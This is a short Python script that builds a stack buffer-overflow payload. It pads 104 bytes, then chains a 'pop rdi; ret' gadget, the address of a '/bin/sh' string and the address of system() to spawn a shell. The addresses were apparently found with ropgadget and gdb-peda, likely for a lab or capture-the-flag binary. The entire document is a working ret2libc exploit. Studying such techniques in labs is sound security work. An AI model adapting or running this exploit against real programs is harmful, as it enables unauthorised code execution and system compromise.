#!/usr/bin/env python3

import sys
from struct import *

buf = b""

# Reach the overflow point
buf += b"A"*104  

# First element: address of pop rdi; ret (from ropgadget)
buf += pack("<Q", 0x0000000000400693)

# Second element: argument of system() (gdb-peda: find "/bin/sh")
buf += pack("<Q", 0x4006e8) 

# Third element: address o system (gdb-peda: p system)
buf += pack("<Q", 0x7ffff7e35e10 )

sys.stdout.buffer.write(buf)
